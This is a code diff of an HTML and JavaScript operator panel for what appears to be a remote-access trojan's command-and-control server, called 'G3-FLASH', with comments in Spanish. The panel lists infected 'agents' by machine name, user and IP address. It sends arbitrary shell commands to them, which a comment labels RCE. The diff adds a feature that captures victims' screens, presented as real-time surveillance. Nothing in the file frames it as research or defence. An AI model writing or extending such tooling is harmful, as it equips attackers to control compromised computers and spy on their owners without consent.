@@ -2,89 +2,100 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>C2 - ADVANCED CONTROL PANEL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>G3-FLASH | ADVANCED C2 PANEL</title>
+    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
-        body {
-            background-color: #0b0e14;
-            color: #00ff41;
-            font-family: 'Fira Code', monospace;
+        :root {
+            --neon-green: #00ff41;
+            --neon-blue: #00d4ff;
+            --neon-red: #ff003c;
+            --bg-dark: #0b0e14;
         }
 
-        /* Contenedor principal con efecto de brillo */
-        .main-container {
-            border: 1px solid #1a1f29;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
-            background: rgba(16, 20, 28, 0.9);
-            border-radius: 8px;
-            padding: 20px;
+        body { 
+            background-color: var(--bg-dark); 
+            color: var(--neon-green); 
+            font-family: 'Fira Code', monospace; 
         }
 
-        /* Estilo de la tabla */
-        .table {
-            color: #00ff41;
-            border-color: #1a1f29;
-            vertical-align: middle;
+        .main-container { 
+            border: 1px solid #1a1f29; 
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1); 
+            background: rgba(16, 20, 28, 0.9); 
+            border-radius: 8px; 
+            padding: 25px; 
+            margin-top: 20px;
         }
 
-        .table thead th {
-            border-bottom: 2px solid #00ff41;
-            text-transform: uppercase;
+        /* Tabla Estilo Matrix */
+        .table { color: var(--neon-green); border-color: #1a1f29; vertical-align: middle; }
+        .table thead th { 
+            border-bottom: 2px solid var(--neon-green); 
+            text-transform: uppercase; 
+            font-size: 0.8rem; 
+            color: var(--neon-blue); 
+        }
+
+        /* Inputs y Terminal */
+        .form-control { 
+            background-color: #05070a; 
+            border: 1px solid var(--neon-green); 
+            color: var(--neon-green); 
+            font-size: 0.9rem;
+        }
+        .form-control:focus { 
+            background-color: #05070a; 
+            color: var(--neon-green); 
+            border-color: var(--neon-blue); 
+            box-shadow: 0 0 10px rgba(0, 212, 255, 0.4); 
+        }
+
+        pre.respuesta-text { 
+            background: #000; 
+            border-left: 3px solid var(--neon-blue); 
+            padding: 12px; 
+            max-height: 150px; 
+            overflow-y: auto; 
+            color: #a0a0a0; 
             font-size: 0.8rem;
-            color: #00d4ff; /* Azul para cabeceras */
+            white-space: pre-wrap;
         }
 
-        /* Input tipo terminal */
-        .form-control {
-            background-color: #05070a;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            font-family: 'Fira Code', monospace;
+        /* Botones Neón */
+        .btn-danger { background: transparent; border: 1px solid var(--neon-red); color: var(--neon-red); }
+        .btn-danger:hover { background: var(--neon-red); color: white; box-shadow: 0 0 15px var(--neon-red); }
+        
+        .btn-info { background: transparent; border: 1px solid var(--neon-blue); color: var(--neon-blue); }
+        .btn-info:hover { background: var(--neon-blue); color: #000; box-shadow: 0 0 15px var(--neon-blue); }
+
+        .status-dot { 
+            height: 10px; width: 10px; 
+            background-color: var(--neon-green); 
+            border-radius: 50%; 
+            display: inline-block; 
+            margin-right: 5px; 
+            box-shadow: 0 0 8px var(--neon-green);
+            animation: pulse 2s infinite;
         }
 
-        .form-control:focus {
-            background-color: #05070a;
-            color: #00ff41;
-            border-color: #00d4ff;
-            box-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
         }
 
-        /* Área de respuesta (Terminal) */
-        pre.respuesta-text {
-            background: #000;
-            border-left: 3px solid #00d4ff;
-            padding: 10px;
-            max-height: 150px;
-            overflow-y: auto;
-            color: #a0a0a0;
-            font-size: 0.85rem;
-        }
-
-        /* Botón de ejecución */
-        .btn-danger {
-            background-color: transparent;
-            border: 1px solid #ff003c;
-            color: #ff003c;
-            transition: 0.3s;
-        }
-
-        .btn-danger:hover {
-            background-color: #ff003c;
-            color: white;
-            box-shadow: 0 0 15px #ff003c;
-        }
-
-        .status-dot {
-            height: 10px;
-            width: 10px;
-            background-color: #00ff41;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 5px;
-            box-shadow: 0 0 8px #00ff41;
+        /* Modal Tuning */
+        .modal-content { background-color: var(--bg-dark); border: 1px solid var(--neon-blue); }
+        .modal-header { border-bottom: 1px solid #1a1f29; }
+        #imgVisor { 
+            max-width: 100%; 
+            border-radius: 4px; 
+            transition: opacity 0.3s ease-in-out;
         }
     </style>
 </head>
@@ -94,10 +105,10 @@
         <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-3" style="border-color: #1a1f29 !important;">
             <h1 class="h3"><i class="fas fa-terminal"></i> G3-FLASH <span class="text-white">C2 PANEL</span></h1>
             <div class="text-end">
-                <span class="badge bg-dark border border-success text-success me-3">
+                <span class="badge bg-dark border border-success text-success me-3 p-2">
                     <span class="status-dot"></span> SYSTEM ONLINE
                 </span>
-                <a href="/logout" class="btn btn-sm btn-outline-warning"><i class="fas fa-sign-out-alt"></i> LOGOUT</a>
+                <a href="/logout" class="btn btn-sm btn-outline-warning"><i class="fas fa-sign-out-alt"></i> TERMINAR SESIÓN</a>
             </div>
         </div>
 
@@ -110,7 +121,7 @@
                         <th><i class="fas fa-user"></i> User</th>
                         <th><i class="fas fa-network-wired"></i> IP Address</th>
                         <th><i class="fas fa-code"></i> Last Output</th>
-                        <th style="width: 300px;"><i class="fas fa-microchip"></i> Action</th>
+                        <th style="width: 350px;"><i class="fas fa-microchip"></i> Operations</th>
                     </tr>
                 </thead>
                 <tbody id="tabla-agentes">
@@ -119,7 +130,27 @@
         </div>
     </div>
 
+    <div class="modal fade" id="screenshotModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog modal-xl">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title text-info"><i class="fas fa-eye"></i> VIGILANCIA EN TIEMPO REAL</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body text-center bg-black">
+                    <div id="loaderImg" class="text-info mb-2" style="display:none;">
+                        <i class="fas fa-sync fa-spin"></i> Descargando datos del agente...
+                    </div>
+                    <img id="imgVisor" src="" class="img-fluid border border-info shadow-lg" alt="Stream del Agente">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
     <script>
+    // --- FUNCIÓN: ACTUALIZAR LISTA DE AGENTES ---
     async function actualizarAgentes() {
         try {
             const response = await fetch('/api/agentes');
@@ -130,22 +161,27 @@
                 let filaExistente = document.getElementById(`fila-${agente.id}`);
 
                 if (filaExistente) {
+                    // Solo actualizamos el log si hay cambios (evita parpadeo)
                     const celdaRespuesta = filaExistente.querySelector('.respuesta-text');
                     if (celdaRespuesta.innerText !== agente.resultado) {
                         celdaRespuesta.innerText = agente.resultado;
                     }
                 } else {
+                    // Creamos fila si el agente es nuevo
                     const nuevaFila = `
-                        <tr id="fila-${agente.id}" class="animate__animated animate__fadeIn">
-                            <td>${agente.id}</td>
-                            <td class="text-info">${agente.pc}</td>
+                        <tr id="fila-${agente.id}">
+                            <td><span class="badge bg-secondary">${agente.id}</span></td>
+                            <td class="text-info fw-bold">${agente.pc}</td>
                             <td class="text-white">${agente.user}</td>
-                            <td>${agente.ip}</td>
+                            <td><small>${agente.ip}</small></td>
                             <td><pre class="respuesta-text">${agente.resultado}</pre></td>
                             <td>
                                 <div class="input-group">
                                     <input type="text" id="cmd-${agente.id}" class="form-control form-control-sm" placeholder="shell@c2:~#">
-                                    <button class="btn btn-sm btn-danger" onclick="enviarComando(${agente.id})">
+                                    <button class="btn btn-sm btn-info" onclick="verScreenshot(${agente.id})" title="Capturar Pantalla">
+                                        <i class="fas fa-camera"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-danger" onclick="enviarComando(${agente.id})" title="Enviar Comando">
                                         <i class="fas fa-paper-plane"></i>
                                     </button>
                                 </div>
@@ -155,25 +191,76 @@
                     tabla.insertAdjacentHTML('beforeend', nuevaFila);
                 }
             });
-        } catch (error) { console.error("Error:", error); }
+        } catch (error) { console.error("Error Polling:", error); }
     }
 
+    // --- FUNCIÓN: CAPTURA DE PANTALLA ---
+    async function verScreenshot(id) {
+        const visor = document.getElementById('imgVisor');
+        const loader = document.getElementById('loaderImg');
+        
+        // Efecto visual de carga
+        loader.style.display = "block";
+        visor.style.opacity = "0.2";
+        
+        const formData = new FormData();
+        formData.append('id', id);
+        formData.append('comando', 'screenshot');
+
+        try {
+            const response = await fetch('/ejecutar', { method: 'POST', body: formData });
+            const data = await response.json();
+
+            if (data.status === "success") {
+                // El timestamp es vital para saltar la caché del navegador
+                const timestamp = new Date().getTime();
+                const nuevaUrl = `/screenshots/screen_${id}.jpg?t=${timestamp}`;
+                
+                // Pre-cargamos la imagen antes de mostrarla
+                const imgTemp = new Image();
+                imgTemp.src = nuevaUrl;
+                imgTemp.onload = () => {
+                    visor.src = nuevaUrl;
+                    visor.style.opacity = "1";
+                    loader.style.display = "none";
+                    
+                    // Abrir modal
+                    const modalElement = document.getElementById('screenshotModal');
+                    const myModal = bootstrap.Modal.getOrCreateInstance(modalElement);
+                    myModal.show();
+                };
+            } else {
+                alert("Agente Offline o Error: " + data.resultado);
+                loader.style.display = "none";
+            }
+        } catch (e) {
+            console.error("Error Screenshot:", e);
+            loader.style.display = "none";
+        }
+    }
+
+    // --- FUNCIÓN: ENVIAR COMANDOS RCE ---
     async function enviarComando(id) {
         const inputCmd = document.getElementById(`cmd-${id}`);
         const cmd = inputCmd.value;
         if (!cmd) return;
-        
+
         const formData = new FormData();
         formData.append('id', id);
         formData.append('comando', cmd);
+        
+        // Limpiamos input inmediatamente para UX
         inputCmd.value = '';
 
-        await fetch('/ejecutar', { method: 'POST', body: formData });
-        actualizarAgentes();
+        try {
+            await fetch('/ejecutar', { method: 'POST', body: formData });
+            actualizarAgentes(); // Forzar actualización rápida
+        } catch (e) { console.error("Error Command:", e); }
     }
 
+    // Bucle de actualización (cada 3 segundos)
     setInterval(actualizarAgentes, 3000);
-    actualizarAgentes();
+    actualizarAgentes(); // Carga inicial
     </script>
 </body>
 </html>
